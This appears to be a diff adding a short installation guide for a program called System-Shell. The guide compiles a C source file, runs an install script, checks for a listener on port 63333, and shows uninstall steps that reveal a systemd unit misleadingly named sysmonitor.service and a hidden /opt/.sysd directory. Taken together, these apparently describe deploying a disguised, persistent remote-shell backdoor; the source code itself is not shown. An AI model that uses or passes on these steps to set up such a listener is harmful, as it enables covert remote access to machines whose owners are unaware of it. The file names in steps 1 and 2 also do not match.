@@ -1,0 +1,27 @@
+1. have gcc installed. run below:
+
+sudo apt install -y build-essential g++ make
+sudo apt install -y libc6-dev
+sudo apt install build-essential -y
+gcc System_Shell_Service.c -o System-Shell-Service -lpthread -O2 -static
+
+
+2. have the binary "System-Shell" and the bash script "install-System-Shell.sh" in the same
+directory such as desktop.
+
+
+3. run these commands in that same directory:
+chmod +x install-System-Shell.sh 
+./install-System-Shell.sh
+
+
+4. confirm its running:
+ss -tuln | grep 63333
+
+
+5. Uninstall:
+sudo systemctl stop sysmonitor.service
+sudo systemctl disable sysmonitor.service
+sudo rm /etc/systemd/system/sysmonitor.service
+sudo rm -rf /opt/.sysd
+sudo systemctl daemon-reexec
